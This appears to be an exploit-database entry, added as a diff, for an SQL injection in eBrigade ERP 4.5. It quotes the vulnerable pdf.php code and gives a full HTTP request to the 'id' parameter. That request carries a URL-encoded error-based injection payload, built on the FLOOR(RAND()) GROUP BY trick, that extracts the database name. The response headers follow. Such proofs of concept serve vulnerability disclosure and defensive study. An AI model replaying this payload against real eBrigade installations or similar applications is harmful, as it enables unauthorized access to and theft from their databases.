@@ -1,0 +1,52 @@
+# Exploit Title: eBrigade ERP 4.5 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-10
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://ebrigade.net/
+# Software Link: https://netcologne.dl.sourceforge.net/project/ebrigade/ebrigade/eBrigade%204.5/ebrigade_4.5.zip
+# Version: 4.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/pdf.php?pdf=DPS&id=[SQL]
+# 
+
+#/[PATH]/pdf.php
+
+#30 $id=$_SESSION['id'];
+#31 
+#32 $badges = ""; $devis = "";
+#33 
+#34 $page =(isset($_GET['page'])?intval($_GET['page']):0);
+#35 
+#36 $doc = (isset($_POST['pdf'])?secure_input($dbc,$_POST['pdf']):(isset($_GET['pdf'])?secure_input($dbc,$_GET['pdf']):""));
+#37 
+#38 $devis = explode(",",(isset($_POST['id'])?secure_input($dbc,$_POST['id']):(isset($_GET['id'])?secure_input($dbc,$_GET['id']):"")));
+#39 
+#40 $badges = explode(",",(isset($_POST['SelectionMail'])?secure_input($dbc,$_POST['SelectionMail']):(isset($_GET['SelectionMail'])?secure_input($dbc,$_GET['SelectionMail']):"")));
+#41 
+	
+GET /[PATH]/pdf.php?pdf=DPS&id=1%20%41%4e%44%28%53%45%4c%45%43%54%20%31%20%46%52%4fM%20%28%53%45%4c%45%43%54%20%43%4f%55%4e%54%28%2a%29%2c%43%4fNCA%54%28%28%53%45%4c%45%43%54%28%53%45%4c%45%43%54%20%43%4f%4e%43AT(C%41%53%54%28%44%41%54%41%42%41%53%45%28%29%20%41%53%20%43%48%41%52%29%2c%30%78%37%65%2c%30%78%34%39%36%38%37%33%36%31%36%65%35%33%36%35%36%65%36%33%36%31%36%65%29%29%20%46%52OM+%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4cES+W%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%44%41%54%41%42%41%53%45%28%29%20%4c%49%4d%49%54+%30%2c%31%29,%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78%20%46%52%4f%4d%20%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4cES+GR%4f%55%50%20%42%59%20%78%29%61%29 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=qsaq65v2oalshif28tmsd7c261
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Thu, 10 Jan 2019 19:14:28 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Content-Length: 875
+Keep-Alive: timeout=5, max=60
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
